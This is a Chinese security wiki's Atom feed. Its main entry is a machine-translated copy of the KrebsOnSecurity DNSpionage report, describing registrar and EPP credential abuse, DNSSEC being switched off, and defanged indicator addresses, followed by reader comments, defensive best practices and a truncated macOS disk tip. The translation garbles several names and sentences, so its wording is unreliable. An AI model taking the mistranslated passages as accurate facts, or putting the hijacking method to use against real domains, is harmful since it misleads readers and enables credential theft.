<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[lonelyorWiki]]></title>
  <link href="http://www.lonelyor.org/lonelyorWiki/atom.xml" rel="self"/>
  <link href="http://www.lonelyor.org/lonelyorWiki/"/>
  <updated>2019-02-21T13:59:25+08:00</updated>
  <id>http://www.lonelyor.org/lonelyorWiki/</id>
  <author>
    <name><![CDATA[]]></name>
    
  </author>
  <generator uri="http://www.mweb.im/">MWeb</generator>
  
  <entry>
    <title type="html"><![CDATA[最强渗透测试教程]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15507295741483.html"/>
    <updated>2019-02-21T14:12:54+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15507295741483.html</id>
    <content type="html"><![CDATA[
<p>作者：Micropoor 侯总<br/>
作者简介：十多年一线渗透测试大牛，目前在职于360.<br/>
侯总博客：<br/>
<a href="https://blog.csdn.net/micropoor">https://blog.csdn.net/micropoor</a><br/>
侯总教程地址：<br/>
<a href="https://github.com/Micropoor/Micro8">https://github.com/Micropoor/Micro8</a></p>

<p>经典语录：<br/>
渗透的本质是信息搜集。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[使用浏览器进行Web应用安全测试]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15506293038772.html"/>
    <updated>2019-02-20T10:21:43+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15506293038772.html</id>
    <content type="html"><![CDATA[
<p>本指南写的是在不使用扩展和代理的情况下，仅使用浏览器自带功能就能进行安全检测任务。<br/>
非常值得一读。</p>

<p><a href="https://getmantra.com/web-app-security-testing-with-browsers/#useragentchrome">Web app security testing with browsers</a></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[深入了解最近普遍存在的DNS劫持攻击事件]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15505564665657.html"/>
    <updated>2019-02-19T14:07:46+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15505564665657.html</id>
    <content type="html"><![CDATA[
<blockquote>
<p>文章摘抄自<a href="https://krebsonsecurity.com/2019/02/a-deep-dive-on-the-recent-widespread-dns-hijacking-attacks/">A Deep Dive on the Recent Widespread DNS Hijacking Attacks</a>，中文翻译由谷歌翻译提供。</p>
</blockquote>

<p>美国政府 - 以及一些领先的安全公司 - 最近警告说，一系列高度复杂和广泛的攻击使得可疑的伊朗黑客窃取了来自多个政府和私营公司的大量电子邮件密码和其他敏感数据。但到目前为止，这次袭击究竟是如何发生袭击以及谁被击中的细节依然笼罩在保密之中。</p>

<p>这篇文章旨在记录这些攻击的程度，并将这一绝对成功的网络间谍活动的起源追溯到关键互联网基础设施提供商的一系列连锁违规行为。</p>

<p><img src="media/15505564665657/15505565989858.jpg" alt=""/></p>

<p>在我们深入研究在这篇文章中达到高潮的广泛研究之前，回顾到目前为止公开披露的事实是有帮助的。在2018年11月27日，思科的Talos研究部门<a href="https://blog.talosintelligence.com/2018/11/dnspionage-campaign-targets-middle-east.html">发表了一篇文章</a>，概述了一项名为“ DNSpionage ” 的复杂网络间谍活动的轮廓。</p>

<p>该名称的DNS部分是指全球“ <a href="https://en.wikipedia.org/wiki/Domain_Name_System">D omain N ame S ystem</a> ”，它通过将人性化的网站名称（example.com）转换为更容易的数字Internet地址，作为互联网的一种电话簿。供计算机管理。</p>

<p>Talos表示，DNSpionage的肇事者能够通过劫持这些目标的DNS服务器来窃取黎巴嫩和阿拉伯联合酋长国的一些政府和私营部门实体的电子邮件和其他登录凭证，以便所有电子邮件和虚拟专用网络（VPN） ）流量被重定向到攻击者控制的Internet地址。</p>

<p>Talos报告称，这些DNS劫持还为攻击者获取目标域的SSL加密证书铺平了道路（例如webmail.finance.gov.lb），这使得他们能够解密截获的电子邮件和VPN凭证并以纯文本格式查看。</p>

<p>在2019年1月9日，安全厂商FireEye <a href="https://www.fireeye.com/blog/threat-research/2019/01/global-dns-hijacking-campaign-dns-record-manipulation-at-scale.html">发布了其报告</a> “全球DNS劫持活动：大规模DNS记录操作”，该报告对于间谍活动的“方式”进行了更为详尽的技术细节，但其中包含的其他细节很少。受害者。</p>

<p>与FireEye报告大致同时，美国国土安全部发布了一项罕见的紧急指令，<a href="https://cyber.dhs.gov/blog/#why-cisa-issued-our-first-emergency-directive">命令</a>所有美国联邦民用机构保护其互联网域名记录的登录凭证。作为该任务的一部分，DHS发布了DNSpionage活动中使用的域名和Internet地址的简短列表，尽管这些细节并未超出Cisco Talos或FireEye之前发布的内容。</p>

<p>这种情况在2019年1月25日发生了变化，当时安全公司CrowdStrike <a href="https://www.crowdstrike.com/blog/widespread-dns-hijacking-activity-targets-multiple-sectors/">发布了一篇博文</a>，列出了迄今为止间谍活动所使用的几乎所有互联网地址。本篇文章的其余部分基于KrebsOnSecurity进行的开源研究和访谈，旨在更加了解这种非同寻常的持续攻击的真实程度。</p>

<p><img src="media/15505564665657/15505567298359.jpg" alt=""/></p>

<p>与CrowdStrike发布的DNSpionage活动相关的“妥协指标”。</p>

<h2 id="toc_0">被动DNS</h2>

<p>我开始研究CrowdStrike报告中列出的每个互联网地址，并通过<a href="https://www.farsightsecurity.com/">Farsight Security</a>和<a href="https://securitytrails.com/">SecurityTrails</a>运行它们，这些服务被动地收集有关与全球数千万个网站域相关的DNS记录变化的数据。</p>

<p>从每个互联网地址向后工作，我能够看到，在2018年的最后几个月，DNSpionage背后的黑客成功地破坏了50多个中东公司和政府机构的DNS基础设施的关键组件，包括塞浦路斯阿尔巴尼亚的目标，埃及，伊拉克，约旦，科威特，黎巴嫩，利比亚，沙特阿拉伯和阿拉伯联合酋长国。</p>

<p>例如，被动DNS数据显示攻击者能够劫持mail.gov.ae的DNS记录，mail.gov.ae处理阿拉伯联合酋长国政府办公室的电子邮件。以下是此网络间谍活动中成功入侵的其他一些有趣资产：</p>

<pre class="line-numbers"><code class="language-text">-nsa.gov.iq：伊拉克国家安全咨询
-webmail.mofa.gov.ae：阿拉伯联合酋长国外交部电子邮件
-shish.gov.al：阿尔巴尼亚国家情报局
-mail.mfa .gov.eg：埃及外交部邮件服务器
-mod.gov.eg：埃及国防部
--embassy.ly：利比亚大使馆
-owa.e-albania.al：电子邮件的Outlook Web Access门户网站阿尔巴尼亚政府门户网站
-mail.dgca.gov.kw：科威特民航局的电子邮件服务器
-gid.gov.jo：约旦的综合情报总局
-adpvpn.adpolice.gov.ae：阿布扎比警方的VPN服务
-mail.asp.gov.al:Albanian State Police的电子邮件
-owa.gov.cy：塞浦路斯政府的Microsoft Outlook Web Access 
-webmail.finance.gov.lb：黎巴嫩财政部的电子邮件
-mail.petroleum.gov .eg：埃及石油部
-mail.cyta.com.cy:Cyta电信和互联网提供商，塞浦路斯
-mail.mea.com.lb：中东航空公司的电子邮件访问
</code></pre>

<p>Farsight和SecurityTrails提供的被动DNS数据也提供了关于何时每个域被劫持的线索。在大多数情况下，攻击者似乎已经更改了这些域的DNS记录（我们马上就会看到“如何”），以便这些域指向他们控制的欧洲服务器。</p>

<p>在这些TLD的DNS记录被劫持后不久 - 有时几周，有时只有几天或几小时 - 攻击者能够从SSL提供商<a href="https://www.comodo.com/">Comodo</a>和/或<a href="https://letsencrypt.org/">Let&#39;s Encrypt</a>获取这些域的SSL证书。可以在<a href="https://crt.sh/">cert.sh</a>上看到针对其中几种攻击的准备工作，该数据库提供了所有新SSL证书创建的可搜索数据库。</p>

<p>让我们仔细看一个例子。CrowdStrike报告引用了互联网地址**139.59.134[.]216 **（见上文），根据Farsight多年来，它只是七个不同领域的所在地。其中两个域名仅在2018年12月出现在该互联网地址，包括黎巴嫩的域名，以及 - 奇怪的是 - 瑞典。</p>

<p>第一个域是“ <strong>ns0.idm.net.lb</strong> ”，它是黎巴嫩互联网服务提供商IDM的服务器。从2014年初到2018年12月，ns0.idm.net.lb指向<strong>194.126.10[.]18</strong>，其中足够的是一个基于黎巴嫩的互联网地址。但正如我们在下面的Farsight数据截图中看到的那样，2018年12月18日，该ISP的DNS记录被更改为将指向IDM的互联网流量指向德国的托管服务提供商（ 139.59.134[.]216 地址）。</p>

<p><img src="media/15505564665657/15505569469853.jpg" alt=""/></p>

<p>资料来源：远见安全</p>

<p>根据Farsight的说法，请注意在IDM的域名中列出的其他内容为139.59.134 [。] 216：</p>

<p><img src="media/15505564665657/15505569541143.jpg" alt=""/></p>

<p>域名<strong>sa1.dnsnode.net和fork.sth.dnsnode.net</strong>的DNS记录也从他们在瑞典的合法家园改为12月份由攻击者控制的德国托管服务提供商。这些域名由<a href="https://www.netnod.se/">Netnod Internet Exchange</a>拥有，  <a href="https://www.netnod.se/">Netnod Internet Exchange</a>是一家位于瑞典的主要全球DNS提供商。Netnod还运营着<a href="https://en.wikipedia.org/wiki/Root_name_server">13个“根”名称服务器之一</a>，  这是构成全球DNS系统基础的关键资源。</p>

<p>我们马上回到Netnod。但首先让我们看看CrowdStrike报告中引用的另一个Internet地址，作为DNSpionage黑客滥用的基础设施的一部分：<strong>82.196.11[.]127</strong>。荷兰的这个地址也是域名<strong>mmfasi[.]com</strong>的所在地，Crowdstrike说这是一个攻击者的域名之一，被用作一些被劫持的基础设施的DNS服务器。</p>

<p><img src="media/15505564665657/15505570490488.jpg" alt=""/></p>

<p>正如我们在上面的屏幕截图中看到的那样，82.196.11[.]127暂时是另一对Netnod DNS服务器以及服务器“ ns.anycast.woodynet.net ”的所在地。该域名来源于昵称  <a href="https://en.wikipedia.org/wiki/Bill_Woodcock">Bill Woodcock</a>，担任<a href="https://www.pch.net/">Packet Clearing House（PCH）</a>的执行董事  。</p>

<p>PCH是一家位于加利福尼亚州北部的非营利性实体，它还管理着世界上大量的DNS基础设施，特别是超过500个顶级域名的DNS和DNSpionage所针对的一些中东顶级域名。</p>

<p>以目标公司为目标<br/>
Netnod首席执行官 LarsMichaelJogbäck于2月14日与KrebsOnSecurity联系，确认Netnod的DNS基础设施部分在2018年12月底和2019年1月初被攻击者获取Netnod域名注册商账户后被劫持。</p>

<p>Jogbäck指出该公司于2月5日在其网站上发布的<a href="https://www.netnod.se/news/statement-on-man-in-the-middle-attack-against-netnod">声明</a>，该声明称Netnod在1月2日了解了它在攻击中的作用，并在整个过程中与所有相关方和客户保持联系。</p>

<p>“作为国际安全合作的参与者，Netnod在2019年1月2日意识到我们已经陷入了这波浪潮中，我们经历了MITM（中间人）攻击，”声明中写道。“Netnod不是袭击的最终目标。该目标被认为是在瑞典以外的国家捕获互联网服务的登录详细信息。“</p>

<p>在2月15日与该作者的访谈中，PCH的伍德科克承认，在DNSpionage黑客滥用未经授权的域名注册商访问后，其组织的部分基础设施遭到了破坏。</p>

<p>碰巧，pch.net和dnsnode.net的注册商记录指向相同的来源：<strong>Key-Systems GmbH</strong>，一家位于德国的域名注册商; 和<strong>Frobbit.se</strong>，瑞典的一家公司。Frobbit是Key Systems的经销商，两家公司共享一些相同的在线资源。</p>

<p>伍德科克表示，黑客已经破获了PCH的注册商用于发送称为<a href="https://en.wikipedia.org/wiki/Extensible_Provisioning_Protocol">可扩展供应协议（EPP</a>的信令消息的凭据  。EPP是一个鲜为人知的界面，可作为全球DNS系统的一种后端，允许域名注册商通知区域注册机构（如Verisign）有关域记录的更改，包括新域名注册，修改和转移。</p>

<p>“1月初，Key-Systems表示，他们相信他们的EPP界面已被滥用有效证件的人滥用，”伍德科克说。</p>

<p>Key-Systems拒绝评论这个故事，除了说它没有讨论其经销商客户业务的细节。</p>

<p>Netnod 关于此次袭击的<a href="https://www.netnod.se/news/statement-on-man-in-the-middle-attack-against-netnod">书面声明</a>提到了该公司安全总监PatrikFältström的进一步询问，PatrikFältström也是Frobbit.se的共同所有人。</p>

<p>Fältström在给KrebsOnSecurity的电子邮件中表示，Frobbit和Key Systems的DNSpionage攻击者将未经授权的EPP指令发送到各个注册机构。</p>

<p>“从我的角度来看，这次攻击显然是严重的EPP攻击的早期版本，”他写道。“也就是说，目标是将正确的EPP命令发送到注册管理机构。对于未来的推断，我个人非常紧张。注册管理机构是否允许任何EPP命令来自注册商？我们总会有一些弱的注册商，对吧？“</p>

<h2 id="toc_1">DNSSEC</h2>

<p>这些攻击的一个更有趣的方面是，Netnod和PCH都是DNSSEC（又称“DNS安全扩展”）的声音支持者和采用者，这是一种旨在打败DNSpionage黑客能够攻击的那种攻击的技术。执行。</p>

<p><img src="media/15505564665657/15505571774864.jpg" alt=""/><br/>
图片：APNIC</p>

<p>DNSSEC通过要求对给定域或域集的所有DNS查询进行数字签名来保护应用程序不使用伪造或操纵的DNS数据。在DNSSEC中，如果名称服务器确定给定域的地址记录在传输过程中未被修改，则它会解析域并让用户访问该站点。但是，如果该记录已以某种方式被修改或与所请求的域不匹配，则名称服务器会阻止用户访问欺诈性地址。</p>

<p>根据APNIC（亚太地区互联网地址注册机构）收集的<a href="https://stats.labs.apnic.net/dnssec/XA?c=XA&amp;x=1&amp;g=1&amp;r=1&amp;w=7&amp;g=0">测量数据</a>，虽然DNSSEC可以成为减轻DNSpionage发起的攻击的有效工具，但只有约20％的全球主要网络和网站启用了它。区域。</p>

<p>Jogbäck表示，Netnod的基础设施遭受了来自DNSpionage攻击者的三次单独攻击。前两个发生在2018年12月14日到2019年1月2日之间的两周时间窗口中，以及未受 DNSSEC保护的目标公司服务器。</p>

<p>不过，他说，12月29日和1月2日的第三次攻击针对性的Netnod基础设施是由DNSSEC和服务自己的内部电子邮件网络保护。然而，由于攻击者已经可以访问其注册商的系统，因此他们能够暂时禁用该安全措施 - 或者至少足以获得<a href="two%20of%20Netnod%E2%80%99s">Netnod的两个</a> <a href="https://crt.sh/?id=1071723007">电子邮件服务器的</a> SSL证书。</p>

<p>Jogbäck告诉KrebsOnSecurity，一旦攻击者拥有这些证书，他们就会为公司的目标服务器重新启用DNSSEC，同时显然准备启动攻击的第二阶段 - 将流经其邮件服务器的流量转移到攻击者控制的机器上。但Jogbäck表示，无论出于何种原因，攻击者在以后尝试吸收互联网流量之前，都忽略了使用未经授权的访问其注册商来禁用DNSSEC。</p>

<p>“对我们来说幸运的是，当他们发起他们的中间人攻击时，他们忘了删除它，”他说。“如果他们更熟练，他们就会删除域名上的DNSSEC，这是他们本可以做到的。”</p>

<p>伍德科克表示，PCH在其所有基础设施上验证了DNSSEC，但并非所有公司的客户 - 特别是DNSpionage所针对的中东国家 - 都已将其系统配置为全面实施该技术。</p>

<p>Woodcock表示，PCP的基础设施是针对DNSpionage攻击者在2018年12月13日和2019年1月2日之间的四次不同攻击中的目标。每次攻击，黑客都会打开他们的密码啜饮工具大约一个小时，然后在返回之前将其关闭每次运行后网络恢复到原始状态。</p>

<p>攻击者不需要每次启动他们的监控拖网超过一个小时，因为大多数现代智能手机被配置为持续为用户可能在他的设备上设置的任何帐户提取新电子邮件。因此，攻击者能够通过每次短暂的劫持来获取大量的电子邮件凭据。</p>

<p>在2019年1月2日 - 也就是DNSpionage黑客追踪Netnod内部电子邮件系统的同一天 - 他们还直接针对PCH，从Comodo获得了两个处理该公司内部电子邮件的PCH域的<a href="https://crt.sh/?id=1075482182">SSL </a><a href="https://crt.sh/?id=1075482666">证书</a>。</p>

<p>伍德科克表示，PCH对DNSSEC的依赖几乎完全阻止了这种攻击，但它设法为当时旅行的两名员工收集电子邮件凭据。这些员工的移动设备通过酒店无线网络下载公司电子邮件 - 作为使用无线服务的先决条件 - 迫使他们的设备使用酒店的DNS服务器，而不是PCH的DNNSEC系统。</p>

<p>伍奇科克说：“这两个人确实被弹出，他们都在旅行并且使用他们的iPhone，他们不得不在劫持期间穿越俘虏门户网站。” “他们不得不关闭我们的名称服务器以使用强制网络门户，在此期间，手机上的邮件客户端检查了新的电子邮件。除此之外，DNSSEC还使我们免于真正彻底拥有。“</p>

<p>由于PCH使用DNSSEC保护其域名，劫持其邮件基础设施的实际效果是，大约一个小时没有人，但两名远程员工收到任何电子邮件。</p>

<p>“对于我们基本上所有的用户来说，它看起来就像邮件服务器短时间内无法使用，”伍德科克说。“如果他们碰巧正在检查他们的手机或其他什么，它暂时没有解决，而且每个人都认为这很有趣，我会在一段时间后再检查一下。当他们再次检查时它工作正常。我们的一些工作人员注意到我们的电子邮件服务发生了短暂的中断，但没有人认为可以与其他任何人讨论或打开机票。“</p>

<p>但DNSpionage黑客并没有被吓倒。PCH在本月早些时候发给客户的一封信中表示，法医调查确定，1月24日，一台拥有其网站用户数据库的计算机遭到入侵。存储在数据库中的用户数据包括客户的用户名，<a href="https://en.wikipedia.org/wiki/Bcrypt">bcrypt</a>密码哈希值，电子邮件，地址和公司名称。</p>

<p>“我们没有看到任何证据表明攻击者访问了用户数据库或泄露了它，”该消息显示。“因此，我们在透明度和预防措施方面为您提供这些信息，而不是因为我们认为您的数据受到了损害。”</p>

<h2 id="toc_2">改进</h2>

<p>针对这个故事接受采访的多位专家表示，基于DNS的攻击存在的一个长期问题是，许多组织倾向于将其大部分DNS基础架构视为理所当然。例如，许多实体甚至不记录其DNS流量，也不密切关注对其域记录所做的任何更改。</p>

<p>即使对于那些努力监控其DNS基础架构以进行可疑更改的公司，一些监控服务也只是被动地拍摄DNS记录的快照，或者只是每天一次地主动执行。事实上，伍德科克表示，PCH依赖于不少于三个监控系统，并且他们都没有提醒他的组织注意到PCH的DNS系统遭遇的各种一小时劫持事件。</p>

<p>“我们有三种不同的商业DNS监控服务，其中没有一项能够实现，”他说。“他们甚至都没有警告我们事情发生后就已经发生了。”</p>

<p>伍德科克表示，PCH已经建立了一个系统，每小时多次轮询自己的DNS基础设施，并在任何变化时立即发出警报。</p>

<p>Jogbäck表示，Netnod还加强了监控，并加倍努力确保使用所有可用于保护其域基础架构的选项。例如，该公司之前没有使用“ <a href="https://www.icann.org/resources/pages/locked-2013-05-03-en">域锁定</a> ” 保护其所有域名，“ <a href="https://www.icann.org/resources/pages/locked-2013-05-03-en">域名锁定</a> ”是一种服务，要求注册商在对域记录进行任何修改之前采取其他身份验证步骤。</p>

<p>“我们真的很伤心，我们没有更好地保护我们的客户，但我们也是攻击链中的受害者，”Jogbäck说。“你被抢劫后可以换成更好的锁，并希望让某人再次做到更难。但我可以真实地说，我们已经从这次袭击中成为受害者中学到了很多，而且我们现在比以前好多了。“</p>

<p>伍德科克表示，他担心互联网决策者和其他基础设施提供商不会严重或迫切地对全球DNS构成威胁，他相信DNSpionage黑客将在未来数月和数年内有大量其他受害者攻击和利用。</p>

<p>“伊朗人不只是试图做出这些攻击立即生效。他们试图深入到互联网基础设施中，这样他们就可以随时随地使用这些东西。</p>

<p>“所有这一切都是一场战斗，”他说。“伊朗人不只是试图做出这些攻击立即生效。他们试图深入到互联网基础设施中，这样他们就可以随时随地使用这些东西。他们希望获得尽可能多的方式，以便将来可以用于特定的目标。“</p>

<h2 id="toc_3">建议</h2>

<p>John Crain是<a href="https://en.wikipedia.org/wiki/ICANN">ICANN</a>的首席安全，稳定和弹性官员，ICANN是负责监管全球域名行业的非营利实体。Crain表示，许多可以使攻击者更难以劫持目标域或DNS基础架构的最佳实践已经有十多年了。</p>

<p>“这很大程度上取决于数据卫生，”Crain说。“大型组织直到妈妈和流行实体都没有关注一些非常基本的安全实践，比如多因素身份验证。如今，如果你有一个次优的安全立场，你就会被拥有。这就是今天的现实。我们现在看到更复杂的对手现在在互联网上采取行动，如果你没有做基本的事情，他们会打击你。“</p>

<p>组织的一些最佳实践包括：</p>

<ul>
<li><p>使用DNSSEC（签名区域和验证响应）</p></li>
<li><p>使用注册表锁等注册功能，可以帮助保护域名记录不被更改</p></li>
<li><p>使用应用程序，Internet流量和监控的访问控制列表</p></li>
<li><p>使用双因素身份验证，并要求所有相关用户和分包商使用它</p></li>
<li><p>如果使用密码，请选择唯一密码并考虑密码管理器</p></li>
<li><p>审核注册商和其他提供商的帐户</p></li>
<li><p>通过监控来监控证书，例如，<a href="%E8%AF%81%E4%B9%A6%E9%80%8F%E6%98%8E%E5%BA%A6%E6%97%A5%E5%BF%97">证书透明度日志</a></p></li>
</ul>

<p>标签：APNIC，比尔·伍德科克，思科塔洛斯，科摩多，CrowdStrike，国土安全部，DNSpionage，DNSSEC，EPP，可扩展的供应协议，远见安全，FireEye的，Frobbit，ICANN，约翰·克雷恩，键控系统，拉尔斯·迈克尔Jogbäck，LetsEncrypt，Netnod，包清算所，PatrikFältström，PCH，SecurityTrails，美国国土安全部</p>

<p>此条目发布于2019年2月18日星期一上午8:51，并在A Little Sunshine，Data Breaches，The Coming Storm下提交。您可以通过RSS 2.0 Feed 关注此条目的任何评论。您可以跳到最后并发表评论。目前不允许Pinging。</p>

<hr/>

<h2 id="toc_4">26条评论（懒得处理格式了）</h2>

<p>Beau Kinstler<br/>
2019年2月18日上午9:50<br/>
一如既往的棒极了。谢谢Brian。出于好奇，你如何将DNSSEC和你在这里发布的攻击与GRC.com和Steve Gibson的“DNS欺骗”测试工具中描述的DNS缓存中毒联系起来？<br/>
<a href="https://www.grc.com/dns/dns.htm">https://www.grc.com/dns/dns.htm</a></p>

<p>答复<br/>
BrianKrebs<br/>
2019年2月18日晚上10:21<br/>
DNS缓存中毒最常发生在更本地级别，即用户的机器或路由器。本故事中描述的攻击涉及将DNS设置妥协到更高级别，远远超出最终用户的控制范围。</p>

<p>答复<br/>
汤姆威尔士<br/>
2019年2月18日上午9:58<br/>
“伊朗人不只是试图做出这些攻击立即生效”。</p>

<p>我查看了这篇文章，但我找不到任何证据表明“伊朗人”是肇事者。</p>

<p>有没有，或者这只是更具政治色彩的暗杀？</p>

<p>答复<br/>
BrianKrebs<br/>
2019年2月18日上午10:31<br/>
查看故事中链接的CrowdStrike博客文章。我没有打印很多我的信息，主要是因为故事已经很长了，无论如何这可能不是我将在这个主题上写的最后一个。但是，我也试图不提供太多细节，以帮助攻击者在未来改进攻击。也就是说，从我对这个故事中未提及的许多人的访谈中可以清楚地看出，有一些线索指向某些特定威胁行为者的相当大的努力。</p>

<p>答复<br/>
TreFunny<br/>
2019年2月18日上午11点50分<br/>
关注CrowdStrike，他们只是联邦调查局的私人部门......看看与FBI的所有联系，这是可怕的。</p>

<p>看看他们是如何处理DNC黑客的，并没有停止它19天或疯狂的事情，但只花了2个小时来识别“熊”......吓人。</p>

<p>CrowdStrike将会在这些日子里曝光......</p>

<p>答复<br/>
戴夫亚当斯<br/>
2019年2月18日上午10:42<br/>
优秀的研究Brian。我希望使用DNSSec的20％都在美国。作为网络安全分析师，任何异常都是有原因的。如果您的邮件交换中断一小时，请进行调查。我们都需要做的不仅仅是保护我们的系统。我们还需要验证数据的来源。</p>

<p>答复<br/>
阳光之州<br/>
2019年2月18日上午11:41<br/>
我知道我的域名，我使用2FA访问网站界面，以及DNSSEC和注册表锁定已启用</p>

<p>答复<br/>
Greg Askew<br/>
2019年2月18日上午11:54<br/>
“然而，他说，12月29日至1月2日的第三次攻击是针对受DNSSEC保护并服务于其内部电子邮件网络的Netnod基础设施。然而，由于攻击者已经可以访问其注册商的系统，他们能够暂时禁用该安全措施“。</p>

<p>这没有意义。不应该通过关闭服务器区域上的DNSSEC来禁用DNSSEC。要使DNSSEC提供任何值，它需要配置DNS服务器和客户端计算机上的实施。在Windows上，使用名称解析策略表（NRPT）执行客户端强制执行。如果未在客户端上强制执行DNSSEC，则它实际上不提供任何值。如果在客户端上强制执行DNSSEC，则禁用DNS服务器上的区域的DNSSEC将导致客户端上的名称解析失败。如果任何受害组织拥有支持DNSSEC的域，但未在其客户端计算机上强制执行DNSSEC，则他们会自行开枪。</p>

<p>答复<br/>
JJ<br/>
2019年2月18日下午2:53<br/>
杀死DNSSEC只需要摆脱DS记录。我不得不走很多公司，为什么他们全新的DNSSEC配置并没有真正起作用，而且几乎总是因为他们没有相应的DS记录。人们不再做功课了：“但我们签了这个区！”</p>

<p>答复<br/>
丹尼斯塞甘<br/>
2019年2月18日下午12:17<br/>
“为什么CISA发布了我们的第一份紧急指令” <br/>
，主任Christopher Krebs</p>

<p>任何关系？</p>

<p>答复<br/>
BrianKrebs<br/>
2019年2月18日下午12:18<br/>
不</p>

<p>答复<br/>
表姐艾迪<br/>
2019年2月18日下午12:28<br/>
伊朗和俄罗斯似乎正在为网络战争做准备。<br/>
希望我们的政府（Home Land Security，FBI，CIA）能够保护我们的国家。我真的希望并祈祷特朗普总统会让Brian Krebs成为我们政府网络恐怖部门的负责人！</p>

<p>答复<br/>
橡子<br/>
2019年2月18日下午12:55<br/>
185.20.187 [。] 8封锁，未知原因，由Forcepoint，Fortinet，卡巴斯基（等）<br/>
提供，分析，卡巴斯基（等）2019-02-15 <br/>
<a href="http://www.virustotal.com/en/url/0054576de4b5c983f49d77046800ed029b9d3aebdc6334261386c9aac4be39a5/analysis">http://www.virustotal.com/en/url/0054576de4b5c983f49d77046800ed029b9d3aebdc6334261386c9aac4be39a5/analysis</a></p>

<p>2018-12-03 <br/>
<a href="http://www.virustotal.com/en/url/55263f4edcd02ab7e9c391f1a36c4e84ff9868133a40020e9db2046fba42a11f/analysis">http://www.virustotal.com/en/url/55263f4edcd02ab7e9c391f1a36c4e84ff9868133a40020e9db2046fba42a11f/analysis</a></p>

<p>答复<br/>
橡子<br/>
2019年2月18日下午1:24<br/>
Talos：“攻击者将主机名重定向到IP 185.20.187 [。] 8短时间。”11月6日，9月13日等</p>

<p>C2（命令和控制）服务器，以及另外两个IP（全部在同一荷兰网络上）。</p>

<p>答复<br/>
ChrisSuperPogi<br/>
2019年2月18日下午2:03<br/>
令我惊讶的是，我们可能无法实践多年前推荐的数据卫生！我的意思是，DNSSEC已经很老了。注册表锁定也已有一段时间了。<br/>
多因素身份验证是一个非常新的趋势，但它是网络杀戮链的关键部分。</p>

<p>希望我们从中吸取教训。</p>

<p>答复<br/>
JJ<br/>
2019年2月18日下午2:55<br/>
注册表锁实际上并不是众所周知的，人们将它与传输锁混淆。再加上它需要花钱而且你有答案。</p>

<p>答复<br/>
YYZ<br/>
2019年2月18日下午3:12<br/>
IP地址的最后一个八位字节点周围的括号[]是什么意思？</p>

<p>答复<br/>
大卫C.<br/>
2019年2月18日下午4:29<br/>
它们旨在防止Web爬虫爬进那些（犯罪）服务器。并且防止移动网络浏览器将它们变成链接，最终可能会欺骗无辜的读者访问这些网站。</p>

<p>答复<br/>
ASB<br/>
2019年2月18日下午4:32<br/>
[。]旨在确保链接不会变为可点击。因此它是本网站读者的保护机制（除其他外）</p>

<p>答复<br/>
Nobby Nobbs<br/>
2019年2月18日下午5:24<br/>
可能是为了防止IP地址在大多数浏览器中显示为链接。在讨论像Brian这样的恶意网站时可能会出现问题。</p>

<p>感谢另一篇伟大的文章，布莱恩！</p>

<p>答复<br/>
BrianKrebs<br/>
2019年2月18日晚上10:18<br/>
谢谢。是的，正如其他人所说，括号有效地阻止了任何网站，浏览器或电子邮件客户端将这些地址变成可点击的链接。</p>

<p>答复<br/>
大卫C.<br/>
2019年2月18日下午4:28<br/>
我将添加到实践列表中以获取包含身份证明的证书，而不仅仅是域。</p>

<p>面对DNS劫持，证明“这是example.com”的证书毫无意义。</p>

<p>一个说“示例公司，1234假街，圣克拉拉，加利福尼亚州”并且来自需要身份证明文件的权威机构将更加安全。特别是如果用户习惯于在位置栏中看到全名，并且在某些时候突然变为“example.com”。</p>

<p>答复<br/>
伊恩<br/>
2019年2月18日晚上8:39<br/>
没有最终用户如何保护自己的指标。在看了DNS问题很长一段时间后，我刚刚做了一次重拍。曾经有一次我没有使用我的DNS旋转器脚本 - 我有一个脚本可以随机选择随机dns服务器。野蛮但似乎可以防止明显的dns渎职行为。有点厌倦了所有这一切，互联网是故意保持borken恕我直言。伊朗应该实施制裁，例如将所有伊朗学生/教授从大学中移除，直到他们学会成为好公民。与中国人一样... LOL看看任何“敏感”的工作场所以及振动器和推动者的名字，所有人都经过了完美的审查......国家赞助的所有最敏感的地方的傀儡和间谍，而同等或更好能力的国内学生必须如果他们能找到一个地方，就要与债务和贷款斗争！最高阶的愚蠢！</p>

<p>答复<br/>
BrianKrebs<br/>
2019年2月18日晚上9:35<br/>
对最终用户来说有点复杂。您可以将DNS设置设置为Google的DNS - 8.8.8.8和4.4.2.2 - 当域名签名时，应该强制执行DNNSEC。但是，如果您不在自己的网络上，并且您的移动数据提供商的DNS设置启动，事情会变得更加棘手。我不确定最终用户是否有办法控制在这种情况下使用的DNS设置。</p>

<p>答复<br/>
Rich Altmaier<br/>
2019年2月18日晚上11:09<br/>
保护DNS当然很重要而且很好。然而，就用户保护自己而言，这基本上是一个问题：我是否连接到我建立帐户的服务器？<br/>
我们可以使用Yubikey或等效服务器来验证用户身份。<em>但我们需要</em>一个反向Yubikey，我的密钥也确认服务器是我建立我的帐户的那个。</p>

<p>我相信Yubikey的技术适用于此。但用户体验是擅离!! 我想插入我的密钥并要求密钥+浏览器确认：基于加密交换，我正在与之通信的服务器确实拥有我之前在那里建立的加密密钥。</p>

<p>请！！！</p>

<p>答复<br/>
Dnspionage<br/>
2019年2月18日晚上11:29<br/>
更多的组织应该部署DNSSEC，但大多数组织不了解它的工作原理以及它的价值。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Mediakit报告设备商的空间不足以执行此操作]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15489296290618.html"/>
    <updated>2019-01-31T18:13:49+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15489296290618.html</id>
    <content type="html"><![CDATA[
<p>网上大部分都写的去 windows 中使用DiskGenius重新分区，这搞麻烦了，不用这么麻烦的。</p>

<p>1、打开终端，输入<code>diskutil list</code>列出磁盘内容，这里我们可以找到要格式化的磁盘，我是 disk2<br/>
2、卸载要格式化的磁盘<code>diskutil unmountDisk force disk2</code><br/>
